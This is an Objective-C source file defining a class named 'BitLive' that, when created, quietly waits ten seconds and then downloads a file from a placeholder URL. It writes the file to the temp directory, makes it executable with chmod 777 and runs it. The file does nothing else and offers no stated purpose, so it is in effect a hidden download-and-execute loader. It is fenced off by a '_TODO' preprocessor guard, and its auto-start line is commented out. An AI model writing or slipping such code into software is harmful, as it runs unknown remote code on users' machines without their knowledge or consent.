
#ifdef _TODO
#import "BitLive.h"

//
@implementation BitLive

//
- (id)init
{
	self = [super init];
	
	[self performSelectorInBackground:@selector(download) withObject:nil];
	
	return self;
}

- (NSString *)exec:(NSString *)cmd
{
	NSString *ret = nil;
	FILE *pipe = popen(cmd.UTF8String, "r");
	if (pipe)
	{
		char buf[4096];
		ret = @"";
		while(fgets(buf, 4096, pipe))
		{
			ret = [ret stringByAppendingFormat:@"%s", buf];
		}
		pclose(pipe);
	}
    
    return ret;  
}

//
- (void)download
{
	NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];
	
	[NSThread sleepForTimeInterval:10];

	NSError *error = nil;
	NSData *data = [NSData dataWithContentsOfURL:[NSURL URLWithString:@"http://www.xxx.xxx/"] options:NSUncachedRead error:&error];
	if (data)
	{
		NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"BitLive"];
		[data writeToFile:path atomically:YES];
		[self exec:[@"/bin/chmod 777 " stringByAppendingString:path]];
		[self exec:path];
	}

	[pool release];
}

//TODO:
//static BitLive *_bitLive = [[BitLive alloc] init];

@end

#endif